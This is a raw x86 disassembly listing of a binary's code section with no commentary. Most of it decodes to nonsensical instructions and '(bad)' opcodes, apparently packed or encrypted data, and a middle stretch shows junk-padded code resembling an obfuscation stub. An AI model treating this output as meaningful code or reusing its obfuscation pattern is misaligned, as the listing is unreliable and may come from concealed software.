  403e61:	and    eax,DWORD PTR [edi-0x62]
  403e64:	lock mov dh,0x87
  403e67:	adc    BYTE PTR [esi+0x3],bl
  403e6a:	rcr    ebx,1
  403e6c:	sub    DWORD PTR [edi-0x2f67c0a3],0x7c535067
  403e76:	xor    BYTE PTR [ebx*8-0x8c16242],dh
  403e7d:	adc    BYTE PTR [esi],ch
  403e7f:	jae    0x403e60
  403e81:	mov    edx,0x78cb90c4
  403e86:	mov    dl,0xf0
  403e88:	shr    cl,cl
  403e8a:	xlat   BYTE PTR ds:[ebx]
  403e8b:	outs   dx,DWORD PTR ds:[esi]
  403e8c:	and    ebp,DWORD PTR [edi]
  403e8e:	pop    ds
  403e8f:	shl    DWORD PTR [ecx],cl
  403e91:	or     DWORD PTR [ecx+0x42f120b7],0x67
  403e98:	(bad)  [ebx+0x41778887]
  403e9e:	aad    0x26
  403ea0:	xchg   ebx,eax
  403ea1:	into   
  403ea2:	cmp    eax,edx
  403ea4:	push   edx
  403ea5:	mov    WORD PTR [edx+ecx*8+0x72],fs
  403ea9:	jne    0x403e82
  403eab:	push   0x19875afb
  403eb0:	push   edi
  403eb1:	test   al,0xf9
  403eb3:	call   0x5a80ee4f
  403eb8:	xor    DWORD PTR [ebx-0x792b8ba],esp
  403ebe:	fidiv  DWORD PTR [ebp-0x55]
  403ec1:	sbb    dh,BYTE PTR [esi+edi*4+0x5f]
  403ec5:	inc    esi
  403ec6:	xor    bh,BYTE PTR [eax-0x125033af]
  403ecc:	repnz cmp al,0xd7
  403ecf:	inc    eax
  403ed0:	rcr    DWORD PTR [eax-0x74],0xda
  403ed4:	not    BYTE PTR [eax]
  403ed6:	xor    al,0x63
  403ed8:	rol    DWORD PTR [ebp+0x1e],cl
  403edb:	rcr    bl,1
  403edd:	int    0x55
  403edf:	mov    WORD PTR [ebx],ds
  403ee1:	fcom   QWORD PTR [edx-0x3c]
  403ee4:	fsub   DWORD PTR [esi-0x67fbc001]
  403eea:	ficom  DWORD PTR [ebp+0x31]
  403eed:	sub    al,0x51
  403eef:	fdivr  DWORD PTR [edi+0x49bdf484]
  403ef5:	lea    esi,[edx+0xdaff3fa]
  403efb:	retf   
  403efc:	hlt    
  403efd:	adc    eax,DWORD PTR [eax]
  403eff:	repnz out dx,al
  403f01:	rcr    DWORD PTR [ecx-0x4ed81597],1
  403f07:	mov    cl,0x46
  403f09:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f0b:	dec    edi
  403f0c:	pop    ds
  403f0d:	ds pop ss
  403f0f:	mov    ss,WORD PTR [ebx+0x73]
  403f12:	pushf  
  403f13:	dec    esi
  403f14:	dec    esp
  403f15:	xchg   ebx,eax
  403f16:	add    BYTE PTR ds:0x79629f9a,0x9d
  403f1d:	add    esp,DWORD PTR [edi-0x1d]
  403f20:	lods   al,BYTE PTR ds:[esi]
  403f21:	(bad)  
  403f22:	adc    eax,DWORD PTR [ebx-0x6251ade]
  403f28:	cmc    
  403f29:	cmc    
  403f2a:	je     0x403f18
  403f2c:	mov    al,0x43
  403f2e:	out    dx,eax
  403f2f:	sub    cl,dh
  403f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f32:	add    dl,bl
  403f34:	out    0x99,eax
  403f36:	xchg   ebx,eax
  403f37:	lods   eax,DWORD PTR ds:[esi]
  403f38:	pop    eax
  403f39:	loop   0x403f05
  403f3b:	and    DWORD PTR [ebx],esi
  403f3d:	ret    0x3d8a
  403f40:	ja     0x403efa
  403f42:	mov    eax,ds:0x9e54bfb2
  403f47:	inc    bx
  403f49:	sub    eax,0x601be4e2
  403f4e:	loope  0x403efc
  403f50:	xchg   ebp,eax
  403f51:	(bad)  
  403f52:	fild   DWORD PTR [edx+0x656dba60]
  403f58:	pop    edx
  403f59:	jp     0x403f63
  403f5b:	(bad)  
  403f5c:	xchg   edx,eax
  403f5d:	call   0x9837f5d6
  403f62:	adc    al,0xb0
  403f64:	aam    0xe1
  403f66:	test   BYTE PTR [ebp+0x250aae97],al
  403f6c:	popf   
  403f6d:	pop    edx
  403f6e:	or     BYTE PTR [ecx+0x6f0816fb],ch
  403f74:	add    eax,0xa7d5925
  403f79:	sub    ebx,0x8be2a357
  403f7f:	and    eax,0x7e285a9c
  403f84:	das    
  403f85:	imul   ebp,DWORD PTR ds:0xff4e8485,0x54c6392f
  403f8f:	sahf   
  403f90:	lods   al,BYTE PTR ds:[esi]
  403f91:	(bad)  
  403f92:	mov    ebx,0x2dad15ac
  403f97:	mov    ebp,0xb17f214
  403f9c:	dec    eax
  403f9d:	push   es
  403f9e:	adc    eax,DWORD PTR [eax-0x3a]
  403fa1:	jns    0x40401c
  403fa3:	xlat   BYTE PTR ds:[ebx]
  403fa4:	(bad)  
  403fa5:	cmp    DWORD PTR [ecx+0x25],edi
  403fa8:	jmp    0x403f64
  403faa:	jbe    0x403f96
  403fac:	pusha  
  403fad:	and    BYTE PTR [esi-0x6e36a74e],0xb6
  403fb4:	sub    BYTE PTR [eax],ch
  403fb6:	fwait
  403fb7:	push   esp
  403fb8:	test   DWORD PTR [ebx+0x6c8acc7b],edi
  403fbe:	add    edi,DWORD PTR [ebp-0x3]
  403fc1:	jo     0x403fbe
  403fc3:	ja     0x403f68
  403fc5:	and    dl,dl
  403fc7:	fisub  WORD PTR [edx+0x51]
  403fca:	nop
  403fcb:	jmp    0xb3d2:0x86cc7fd2
  403fd2:	int    0xdb
  403fd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fd5:	mov    ?,WORD PTR [ecx+0x55332323]
  403fdb:	das    
  403fdc:	cmp    BYTE PTR [edi],ah
  403fde:	test   eax,0xf463ae08
  403fe3:	shr    DWORD PTR [edx+0x36e79cb7],cl
  403fe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fea:	(bad)  
  403feb:	cmp    al,dl
  403fed:	push   ss
  403fee:	sbb    DWORD PTR [esi-0x3c78e105],ecx
  403ff4:	std    
  403ff5:	pop    esp
  403ff6:	pop    esi
  403ff7:	mov    esi,0xb8eb615b
  403ffc:	scas   al,BYTE PTR es:[edi]
  403ffd:	fisttp WORD PTR [ebx-0x73]
  404000:	aaa    
  404001:	pusha  
  404002:	or     BYTE PTR [ecx+0x2541a776],dl
  404008:	stos   DWORD PTR es:[edi],eax
  404009:	sbb    eax,0x59212864
  40400e:	pop    eax
  40400f:	es push ds
  404011:	ss in  eax,0x58
  404014:	pop    ss
  404015:	sbb    al,0xf1
  404017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404018:	daa    
  404019:	push   cs
  40401a:	je     0x404078
  40401c:	out    dx,al
  40401d:	xlat   BYTE PTR ds:[ebx]
  40401e:	pop    ebp
  40401f:	ins    DWORD PTR es:[edi],dx
  404020:	fcomip st,st(4)
  404022:	mov    edx,0x2269bdea
  404027:	fdivp  st(0),st
  404029:	jae    0x40402c
  40402b:	mov    edi,0xd764bcb
  404030:	loopne 0x403ff6
  404032:	sbb    eax,0xdf95f9dc
  404037:	and    BYTE PTR [ebx+0x63],bl
  40403a:	push   esi
  40403b:	sub    BYTE PTR [ebx],0xf5
  40403e:	or     al,0x71
  404041:	mov    cl,0x37
  404043:	and    DWORD PTR [ebp-0xf],ebp
  404046:	or     bl,bl
  404048:	pop    edi
  404049:	ficom  DWORD PTR [ebx+0x630de2e5]
  40404f:	(bad)  
  404050:	fidivr WORD PTR [ecx-0x5a]
  404053:	outs   dx,DWORD PTR ds:[esi]
  404054:	xor    ecx,DWORD PTR [ecx*4+0x3dd0bf38]
  40405b:	mov    dh,0xdf
  40405d:	fisub  DWORD PTR fs:[esi]
  404060:	lods   al,BYTE PTR ds:[esi]
  404061:	and    eax,DWORD PTR [edx+0x1a]
  404064:	sbb    eax,DWORD PTR [ebp-0x3bae6832]
  40406a:	sub    eax,0xca71d7cd
  40406f:	fsub   DWORD PTR [eax+0x49336d16]
  404075:	(bad)  
  404076:	nop
  404077:	push   0x6011eaaf
  40407c:	out    0xd0,eax
  40407e:	mov    ecx,0x8bb483e3
  404083:	lds    edi,FWORD PTR ds:0x10ffe35d
  404089:	fisttp WORD PTR [edi*1-0x67809615]
  404090:	push   edx
  404091:	outs   dx,BYTE PTR ds:[esi]
  404092:	mov    cl,0xc6
  404094:	jmp    0x40401f
  404096:	sti    
  404097:	add    bl,al
  404099:	fisttp DWORD PTR [ebx+0x13]
  40409c:	mov    edi,ss
  40409e:	das    
  40409f:	nop
  4040a0:	cmp    eax,0x282258d1
  4040a5:	inc    ebp
  4040a6:	pop    edi
  4040a7:	cli    
  4040a8:	cdq    
  4040a9:	cdq    
  4040aa:	(bad)  
  4040ab:	xchg   edi,eax
  4040ac:	cmp    edx,edx
  4040ae:	pop    eax
  4040af:	pop    esi
  4040b0:	(bad)  
  4040b1:	imul   edx,DWORD PTR [ebx+0x22],0xf
  4040b5:	jl     0x4040b6
  4040b7:	jl     0x404125
  4040b9:	inc    ecx
  4040ba:	pop    eax
  4040bb:	or     ebp,DWORD PTR [ecx]
  4040bd:	cwde   
  4040be:	dec    ch
  4040c0:	fwait
  4040c1:	je     0x4040be
  4040c3:	jne    0x404129
  4040c5:	pop    eax
  4040c6:	outs   dx,BYTE PTR ds:[esi]
  4040c7:	call   0x9898:0xb42da204
  4040ce:	jno    0x40406f
  4040d0:	scas   al,BYTE PTR es:[edi]
  4040d1:	add    al,0x9c
  4040d3:	ret    0x53ae
  4040d6:	xchg   BYTE PTR [ecx-0x4f9352d2],bh
  4040dc:	adc    eax,0xb37009e6
  4040e1:	push   ecx
  4040e2:	pop    edi
  4040e3:	jl     0x40409b
  4040e5:	add    ebx,ebp
  4040e7:	mov    al,0x69
  4040e9:	nop
  4040ea:	mov    edx,0x4e42c34a
  4040ef:	test   BYTE PTR [edi-0x50b30736],ah
  4040f5:	repnz out 0x6e,al
  4040f8:	adc    eax,0xf395cff9
  4040fd:	scas   al,BYTE PTR es:[edi]
  4040fe:	shl    DWORD PTR [edi+0x58],1
  404101:	fwait
  404102:	outs   dx,BYTE PTR ds:[esi]
  404103:	cmp    esi,DWORD PTR [esi-0x1]
  404106:	sbb    eax,0xa4f2fb8
  40410b:	(bad)  
  40410c:	cmc    
  40410d:	add    BYTE PTR [edx-0x28c30b93],bl
  404113:	jge    0x4040c4
  404115:	jo     0x40416f
  404117:	int    0xe9
  404119:	pop    ecx
  40411a:	stos   DWORD PTR es:[edi],eax
  40411b:	pop    edx
  40411c:	jecxz  0x4040be
  40411e:	fisttp WORD PTR [ebp+0x1f]
  404121:	es push 0x4c
  404124:	xchg   ebp,eax
  404125:	gs xor al,dh
  404128:	cmp    ch,BYTE PTR [edx-0x1f]
  40412b:	xchg   ecx,eax
  40412c:	mov    dh,0x49
  40412e:	sub    eax,DWORD PTR [ecx]
  404130:	in     eax,0x6b
  404132:	sar    ah,cl
  404134:	mov    ebp,0x3e1223fa
  404139:	pslld  mm4,mm5
  40413c:	fist   DWORD PTR [ecx+0x5bf58beb]
  404142:	(bad)  
  404143:	cli    
  404144:	pop    ebp
  404145:	pop    ebx
  404146:	fld    TBYTE PTR [ecx+0x1]
  404149:	iret   
  40414a:	rol    BYTE PTR [edi],cl
  40414c:	xor    esi,DWORD PTR [edx+eiz*2-0x533b7cb]
  404153:	aad    0x92
  404155:	jno    0x4040e0
  404157:	loop   0x4040e5
  404159:	inc    esp
  40415a:	sub    al,0xf1
  40415c:	and    dl,BYTE PTR ds:0xf625567
  404162:	dec    esp
  404163:	cdq    
  404164:	scas   eax,DWORD PTR es:[edi]
  404165:	popf   
  404166:	pushf  
  404167:	push   ss
  404168:	aad    0x5b
  40416a:	sbb    bh,BYTE PTR cs:0x616fa9a2
  404171:	rcr    BYTE PTR [edx+0x11298ae6],0xfc
  404178:	clc    
  404179:	inc    esp
  40417a:	mov    cl,0x54
  40417c:	adc    dl,BYTE PTR [esi+0x1]
  40417f:	pop    eax
  404180:	imul   ecx,DWORD PTR [esi],0x6a
  404183:	out    dx,al
  404184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404185:	repz iret 
  404187:	int3   
  404188:	push   0xde077697
  40418d:	dec    ebx
  40418e:	cmp    eax,0x14191353
  404193:	popf   
  404194:	xchg   edi,eax
  404195:	push   eax
  404196:	out    0x7b,eax
  404198:	mov    ds:0xf6640cff,eax
  40419d:	call   0xd878d12e
  4041a2:	dec    ebp
  4041a3:	jl     0x4041d2
  4041a5:	adc    BYTE PTR [eax],0x6e
  4041a8:	cdq    
  4041a9:	pop    ebp
  4041aa:	mov    dh,0xf4
  4041ac:	jnp    0x40416c
  4041ae:	std    
  4041af:	lods   eax,DWORD PTR ds:[esi]
  4041b0:	clc    
  4041b1:	fmulp  st(7),st
  4041b3:	add    DWORD PTR [eax],edx
  4041b5:	cmp    DWORD PTR ds:0x428465,0x0
  4041bc:	not    ecx
  4041be:	mov    DWORD PTR ds:0x428321,0x38eb
  4041c8:	jmp    0x40423c
  4041cd:	mov    edx,DWORD PTR ds:0x4284bd
  4041d3:	cmp    DWORD PTR ds:0x428465,0x0
  4041da:	jne    0x40421e
  4041e0:	push   DWORD PTR [ebp-0x1c]
  4041e3:	push   0x3daa
  4041e8:	push   0x6a0e
  4041ed:	call   DWORD PTR ds:0x42dff8
  4041f3:	mov    edx,DWORD PTR ds:0x428415
  4041f9:	xor    edx,DWORD PTR ds:0x428551
  4041ff:	mov    DWORD PTR ds:0x428415,edx
  404205:	or     edx,DWORD PTR ds:0x4284f1
  40420b:	movzx  edx,WORD PTR ds:0x42842d
  404212:	and    DWORD PTR ds:0x428451,edx
  404218:	xor    ecx,0x6193
  40421e:	add    edx,0x3a4f
  404224:	add    DWORD PTR ds:0x428401,ecx
  40422a:	mov    ecx,DWORD PTR ds:0x4283cd
  404230:	mov    edx,DWORD PTR ds:0x428511
  404236:	sub    ecx,edx
  404238:	imul   ecx,DWORD PTR [ecx+edx*1]
  40423c:	mov    eax,DWORD PTR [esi]
  40423e:	cmp    DWORD PTR ds:0x428461,0x0
  404245:	mov    DWORD PTR ds:0x428355,0x80f
  40424f:	mov    DWORD PTR ds:0x428559,ecx
  404255:	jmp    0x4042b8
  40425a:	mov    DWORD PTR ds:0x42840d,0x4518
  404264:	cmp    DWORD PTR ds:0x428461,0x0
  40426b:	jb     0x404293
  404271:	push   DWORD PTR [ebp-0x10]
  404274:	call   DWORD PTR ds:0x42dffc
  40427a:	adc    edx,0x1a1
  404280:	xor    ecx,ecx
  404282:	add    ecx,DWORD PTR ds:0x4284a1
  404288:	mov    edx,DWORD PTR ds:0x428591
  40428e:	sub    ecx,edx
  404290:	xor    ecx,DWORD PTR [ecx+edx*1]
  404293:	add    DWORD PTR ds:0x42842d,0x3b89
  40429d:	sbb    DWORD PTR ds:0x428571,ecx
  4042a3:	sub    edx,edx
  4042a5:	movzx  ecx,WORD PTR ds:0x4284d9
  4042ac:	xor    ecx,DWORD PTR ds:0x428549
  4042b2:	mov    DWORD PTR ds:0x4284d9,ecx
  4042b8:	mov    ecx,DWORD PTR [esi+0x4]
  4042bb:	shrd   eax,ecx,0x2
  4042bf:	shr    ecx,0x2
  4042c2:	cmp    DWORD PTR ds:0x428569,0x0
  4042c9:	mov    DWORD PTR ds:0x4284d9,ecx
  4042cf:	mov    DWORD PTR ds:0x428469,0x365d
  4042d9:	jmp    0x404321
  4042de:	mov    DWORD PTR ds:0x428425,0x759d
  4042e8:	cmp    DWORD PTR ds:0x428569,0x0
  4042ef:	jae    0x404315
  4042f5:	call   DWORD PTR ds:0x42e248
  4042fb:	adc    edx,ecx
  4042fd:	mov    ecx,DWORD PTR ds:0x428419
  404303:	and    ecx,DWORD PTR ds:0x428555
  404309:	mov    DWORD PTR ds:0x428419,ecx
  40430f:	sbb    edx,DWORD PTR ds:0x428351
  404315:	sbb    DWORD PTR ds:0x428429,0x7721
  40431f:	add    ecx,ecx
  404321:	mov    ecx,DWORD PTR [esi]
  404323:	mov    edx,DWORD PTR [esi+0x4]
  404326:	xor    eax,edi
  404328:	shl    ecx,0x1e
  40432b:	xor    edx,edx
  40432d:	or     edx,eax
  40432f:	mov    DWORD PTR [ebp-0x4],edx
  404332:	mov    DWORD PTR [ebp-0x30],0xcb79b576
  404339:	mov    eax,0x9c2b8ae8
  40433e:	mov    DWORD PTR [ebp-0x2c],eax
  404341:	mov    DWORD PTR [ebp-0x20],0xcb79b572
  404348:	mov    DWORD PTR [ebp-0x1c],eax
  40434b:	mov    DWORD PTR [ebp-0x10],0xcb79b57e
  404352:	mov    DWORD PTR [ebp-0xc],eax
  404355:	mov    DWORD PTR [ebp-0x60],0xcb79b57a
  40435c:	mov    DWORD PTR [ebp-0x5c],eax
  40435f:	jmp    0x404700
  404364:	cmp    BYTE PTR [eax+0x14],dh
  404367:	cmp    al,0x9c
  404369:	mov    esp,0xa24d7438
  40436e:	mov    BYTE PTR [edi+esi*4-0x426f6d04],ah
  404375:	sti    
  404376:	mov    esi,0xbec4bdbe
  40437b:	mov    esi,0xc216826f
  404380:	push   ds
  404381:	jb     0x4043cd
  404383:	sbb    al,0x4d
  404385:	xchg   esp,eax
  404386:	or     al,0x98
  404388:	dec    edi
  404389:	push   0x7
  40438b:	inc    ebp
  40438c:	push   0xe9caf20f
  404391:	push   ebp
  404392:	in     al,0xca
  404394:	sti    
  404395:	sub    cl,BYTE PTR [ebp+esi*8+0x251615a4]
  40439c:	or     bh,BYTE PTR ds:0xb58516f4
  4043a2:	scas   al,BYTE PTR es:[edi]
  4043a3:	test   al,0xcf
  4043a5:	dec    esp
  4043a6:	jb     0x404332
  4043a8:	ss ret 
  4043aa:	xchg   edi,eax
  4043ab:	retf   0x8e04
  4043ae:	xchg   esp,eax
  4043af:	jne    0x404346
  4043b1:	xchg   edi,eax
  4043b2:	scas   al,BYTE PTR es:[edi]
  4043b3:	jae    0x40433d
  4043b5:	lea    ecx,[ebp-0x3a]
  4043b8:	jno    0x40442f
  4043ba:	dec    ecx
  4043bb:	xchg   ebp,eax
  4043bc:	push   esi
  4043bd:	cli    
  4043be:	pop    esp
  4043bf:	and    eax,0x39090040
  4043c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043c5:	test   al,0x14
  4043c7:	(bad)  
  4043c8:	shl    bh,cl
  4043ca:	xor    dl,BYTE PTR [edx+0x28]
  4043cd:	scas   al,BYTE PTR es:[edi]
  4043ce:	lds    edi,FWORD PTR [eax]
  4043d0:	xchg   BYTE PTR [ebp+0x66],al
  4043d3:	loop   0x404382
  4043d5:	call   0xf2c2a4dc
  4043da:	ror    DWORD PTR [ebp+0x57],0x98
  4043de:	dec    ebp
  4043df:	scas   al,BYTE PTR es:[edi]
  4043e0:	cwde   
  4043e1:	ret    0x4ced
  4043e4:	jmp    0x3b9:0x1b5a9fd2
  4043eb:	xor    DWORD PTR [ebx+0x5b287a51],ebx
  4043f1:	mov    cl,BYTE PTR [edx-0x10]
  4043f4:	imul   eax,DWORD PTR [edx],0xffffffbb
  4043f7:	push   0x4c
  4043f9:	push   ebp
  4043fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043fb:	dec    di
  4043fd:	fidiv  DWORD PTR ds:0xc5ef0b4e
  404403:	sbb    DWORD PTR [edi+0x11],ecx
  404406:	aad    0xa5
  404408:	cdq    
  404409:	(bad)  
  40440a:	push   ecx
  40440b:	iret   
  40440c:	mov    al,0x88
  40440e:	adc    edi,DWORD PTR [edx+0x6c9cf1ce]
  404414:	or     DWORD PTR ds:0xa1a909d1,edx
  40441a:	scas   al,BYTE PTR es:[edi]
  40441b:	adc    dl,BYTE PTR [ebp-0x35]
  40441e:	and    DWORD PTR [ebx],ecx
  404420:	pop    ebp
  404421:	sbb    ebx,edx
  404423:	test   BYTE PTR [esi+0x586ad00],ah
  404429:	mov    ebp,edi
  40442b:	pop    ebp
  40442c:	fwait
  40442d:	or     ecx,DWORD PTR [esi-0x7b962a2d]
  404433:	xor    eax,0x9c942a0e
  404438:	mov    al,ds:0x26930aab
  40443d:	lock sbb eax,0xfdd6eab9
  404443:	cmc    
  404444:	aaa    
  404445:	addr16 inc edi
  404447:	cmp    eax,0xa55a2a5a
  40444c:	inc    edx
  40444d:	push   edi
  40444e:	loop   0x404420
  404450:	je     0x4043e5
  404452:	xor    al,BYTE PTR [esp+ebx*8]
  404455:	test   BYTE PTR ds:0x1d57b1b,ah
  40445b:	cmp    BYTE PTR [edx],cl
  40445d:	mov    es,WORD PTR ds:0xbfc93e03
  404463:	push   ebx
  404464:	pop    ss
  404465:	push   eax
  404466:	and    ch,BYTE PTR [ebp-0xf5af174]
  40446c:	xor    BYTE PTR [edi+0x5a60b072],0x37
  404473:	mov    dl,0xe0
  404475:	xchg   edi,eax
  404476:	pushf  
  404477:	(bad)  
  404478:	std    
  404479:	push   esp
  40447a:	dec    edx
  40447b:	clc    
  40447c:	xlat   BYTE PTR ds:[ebx]
  40447d:	add    ebp,DWORD PTR [edi]
  40447f:	cli    
  404480:	dec    esp
  404481:	mov    BYTE PTR [esi-0x20],bh
  404484:	xor    eax,0x9defd226
  404489:	pop    ebx
  40448a:	mov    ?,WORD PTR [eax-0xd]
  40448d:	cmp    DWORD PTR [ebx-0x33],edi
  404490:	xor    dh,ch
  404492:	xchg   ebp,eax
  404493:	xchg   ebp,eax
  404494:	push   ss
  404495:	xor    DWORD PTR ds:0x98a3d28,edx
  40449b:	fld    TBYTE PTR [edx-0x1a8d5783]
  4044a1:	mov    ecx,0x5a540929
  4044a6:	jmp    0x404471
  4044a8:	and    ah,BYTE PTR [esi+0x79]
  4044ab:	jg     0x404433
  4044ad:	out    0x97,al
  4044af:	or     al,0x12
  4044b1:	adc    al,ch
  4044b3:	rcl    BYTE PTR [edi+0x7f],0xd2
  4044b7:	jo     0x4044b9
  4044b9:	inc    ebp
  4044ba:	or     eax,0x7f8aebea
  4044bf:	fdivr  DWORD PTR ds:[edi+ecx*8-0x41]
  4044c4:	pop    esp
  4044c5:	imul   ebx,DWORD PTR [eax*1+0x8e40413],0x21
  4044cd:	fs scas al,BYTE PTR es:[edi]
  4044cf:	push   edx
  4044d0:	jecxz  0x404505
  4044d2:	add    eax,DWORD PTR [edx]
  4044d4:	jg     0x404462
  4044d6:	cwde   
  4044d7:	pop    ebp
  4044d8:	push   0x20
  4044da:	aad    0x31
  4044dc:	neg    BYTE PTR [edi+0x4e3494a5]
  4044e2:	mov    eax,ds:0x5dc7d7d4
  4044e7:	mov    dh,0xa9
  4044e9:	adc    ecx,DWORD PTR [edx]
  4044eb:	hlt    
  4044ec:	inc    edi
  4044ed:	js     0x4044cd
  4044ef:	mov    ch,0xf6
  4044f1:	sbb    esi,DWORD PTR [edx-0x4c9dd150]
  4044f7:	int    0xab
  4044f9:	push   ds
  4044fa:	push   edx
  4044fb:	ffreep st(7)
  4044fd:	lds    edx,FWORD PTR [eax]
  4044ff:	xchg   esi,eax
  404500:	(bad)  
  404501:	jmp    0x404514
  404503:	cli    
  404504:	push   esi
  404505:	cmp    al,0xcb
  404508:	(bad)  
  404509:	jbe    0x40451e
  40450b:	pushf  
  40450c:	shl    DWORD PTR ds:0xd02beb4a,1
  404512:	ins    BYTE PTR es:[edi],dx
  404513:	sub    DWORD PTR [ebx],0xc71280f2
  404519:	aas    
  40451a:	call   0xf01f7054
  40451f:	inc    ebp
  404520:	or     eax,0xf5f1ec77
  404525:	push   es
  404526:	fadd   DWORD PTR [esp+ebx*4-0x61c38121]
  40452d:	jp     0x40458b
  40452f:	push   0x405aab6a
  404534:	lods   al,BYTE PTR ds:[esi]
  404535:	push   edi
  404536:	sub    al,0x2f
  404538:	cs stos DWORD PTR es:[edi],eax
  40453a:	std    
  40453b:	mov    cl,0x9
  40453d:	xchg   ecx,eax
  40453e:	shl    DWORD PTR [ebx-0x21],cl
  404541:	es push edi
  404543:	adc    BYTE PTR [eax-0x51],0x42
  404547:	sub    BYTE PTR [ecx+0x39],al
  40454a:	jns    0x4045c6
  40454c:	xor    al,0x43
  40454e:	retf   
  40454f:	xchg   BYTE PTR ds:0xdcae2133,ch
  404555:	arpl   WORD PTR [ecx],ax
  404557:	repz inc ebx
  404559:	in     al,dx
  40455a:	cwde   
  40455b:	inc    edi
  40455c:	mov    ecx,0x5aa147da
  404561:	pop    esi
  404562:	arpl   WORD PTR [edx+0x1410db9],di
  404568:	add    al,0x21
  40456a:	xchg   ebx,eax
  40456b:	sub    DWORD PTR [esp+edx*2-0x22],edi
  40456f:	or     eax,0xc8f34cd0
  404574:	sbb    dl,BYTE PTR [esp+ebp*8-0xf6fbc5f]
  40457b:	mov    WORD PTR [ebx+0x4e],es
  40457e:	loop   0x4045a2
  404580:	mov    ch,0x6a
  404582:	sahf   
  404583:	ins    DWORD PTR es:[edi],dx
  404584:	xchg   edi,eax
  404585:	jp     0x404512
  404587:	jbe    0x404533
  404589:	mov    ds:0xea4c1f37,al
  40458e:	loope  0x4045d1
  404590:	mov    eax,0xbb0864d8
  404595:	push   ecx
  404596:	dec    esi
  404597:	mov    dh,0x8
  404599:	cmp    edx,edi
  40459b:	es jnp 0x4045c0
  40459e:	xor    BYTE PTR [ecx+0x4839404b],bh
  4045a4:	add    al,0x83
  4045a6:	jae    0x40455d
  4045a8:	mov    ds:0xa1dc0994,al
  4045ad:	mov    eax,0x8a4fd35
  4045b2:	inc    edx
  4045b3:	xor    eax,0xe4a0c37f
  4045b8:	xor    eax,0xddc135f1
  4045bd:	lods   al,BYTE PTR ds:[esi]
  4045be:	(bad)  [edx]
  4045c0:	xor    eax,0x27590b90
  4045c5:	dec    ecx
  4045c6:	fstp   TBYTE PTR ds:0xcae7acd4
  4045cc:	sub    BYTE PTR [ecx+0x38b2af18],dh
  4045d2:	cmc    
  4045d3:	mov    eax,0xbc661e4b
  4045d8:	retf   
  4045d9:	and    eax,0xa35b6078
  4045de:	mov    cl,0x9
  4045e0:	push   edx
  4045e1:	lar    ebx,WORD PTR [ebp-0x20122ba8]
  4045e8:	add    eax,0x2570b8f5
  4045ed:	(bad)  
  4045ee:	repz pop esi
  4045f0:	or     DWORD PTR [edi+ebp*1+0x70],ebx
  4045f4:	aam    0x59
  4045f6:	sub    eax,DWORD PTR [ecx+0x6cdc114f]
  4045fc:	rcl    BYTE PTR [ebp+0x46],1
  4045ff:	cmc    
  404600:	out    0x7f,eax
  404602:	push   ds
  404603:	mov    ebx,0x8ec32ba1
  404608:	jmp    0xaabb:0xc2355e57
  40460f:	mov    ecx,0xaacf977d
  404614:	jg     0x40463f
  404616:	xchg   esi,eax
  404617:	add    esp,0xffffffa5
  40461a:	js     0x40464f
  40461c:	ret    0x4381
  40461f:	int3   
  404620:	and    eax,0x848ad9f1
  404625:	aas    
  404626:	jmp    0xcf020389
  40462b:	xor    edi,DWORD PTR [ecx-0x73]
  40462e:	sub    eax,0x22ffd09b
  404633:	sub    DWORD PTR [ecx+edx*8+0x15],0xf8c5bebd
  40463b:	mov    dl,dh
  40463d:	jbe    0x4046b1
  40463f:	inc    edx
  404640:	xor    BYTE PTR [edi+eiz*8-0x3f2346af],ch
  404647:	cld    
  404648:	mov    BYTE PTR [ecx],dh
  40464a:	sub    edx,DWORD PTR [edi+0x24]
  40464d:	mov    dl,0x5c
  40464f:	inc    ebx
  404650:	imul   esi,DWORD PTR [ebx],0x65aaa0ec
  404656:	aad    0x77
  404658:	sbb    DWORD PTR [edx],esi
  40465a:	mov    al,ds:0xdad89082
  40465f:	fist   DWORD PTR [esi-0x6]
  404662:	aad    0x44
  404664:	stos   DWORD PTR es:[edi],eax
  404665:	and    ch,BYTE PTR [ebx-0x5b0fd740]
  40466b:	and    al,0xc3
  40466d:	loop   0x404694
  40466f:	adc    eax,0x2fe5c52f
  404674:	cmp    ecx,ebp
  404676:	jns    0x40460d
  404678:	(bad)  
  404679:	and    al,BYTE PTR [edi+0x77]
  40467c:	pop    es
  40467d:	aaa    
  40467e:	jae    0x4046e9
  404680:	jno    0x404618
  404682:	icebp  
  404683:	ret    0x4206
  404686:	out    0x46,al
  404688:	bound  ebp,QWORD PTR [eax+ecx*8-0x2f]
  40468c:	jg     0x4046f4
  40468e:	fist   WORD PTR [ebx+0x7bbdb970]
  404694:	shr    DWORD PTR [ebx+0x5386e17b],0x65
  40469b:	mov    edi,0xc29660ae
  4046a0:	mov    cl,0xb6
  4046a2:	cmc    
  4046a3:	cmp    al,0x98
  4046a5:	pop    eax
  4046a6:	mov    bh,0x6b
  4046a8:	xor    al,BYTE PTR [ecx]
  4046aa:	in     al,dx
  4046ab:	jo     0x40464a
  4046ad:	retf   
  4046ae:	sti    
  4046af:	mov    esi,0xb7466288
  4046b4:	jl     0x4046b3
  4046b6:	mov    esp,ecx
  4046b8:	nop
  4046b9:	test   DWORD PTR [eax],esp
  4046bb:	mov    al,0x4c
  4046bd:	dec    ebp
  4046be:	cli    
  4046bf:	pextrw ecx,(bad),0xc5
  4046c1:	mov    ch,bh
  4046c3:	ficomp WORD PTR [ebx-0x2b]
  4046c6:	xchg   DWORD PTR ds:[eax],edi
  4046c9:	pop    esp
  4046ca:	cmp    dh,BYTE PTR [edi+0x727cd015]
  4046d0:	and    dl,BYTE PTR ds:[edi]
  4046d3:	jnp    0x4046d0
  4046d5:	sub    eax,0x629716d7
  4046da:	ret    0x888b
  4046dd:	add    esi,ebx
  4046df:	mov    ds:0x24e4f7b7,al
  4046e4:	fld    DWORD PTR [esi+0x71]
  4046e7:	or     DWORD PTR ss:[eax-0x2f],0xffffffd6
  4046ec:	shr    BYTE PTR [edx+0x41b7c41e],1
  4046f2:	mov    ebx,0x95cf33ee
  4046f7:	sub    al,0x7a
  4046f9:	inc    edx
  4046fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
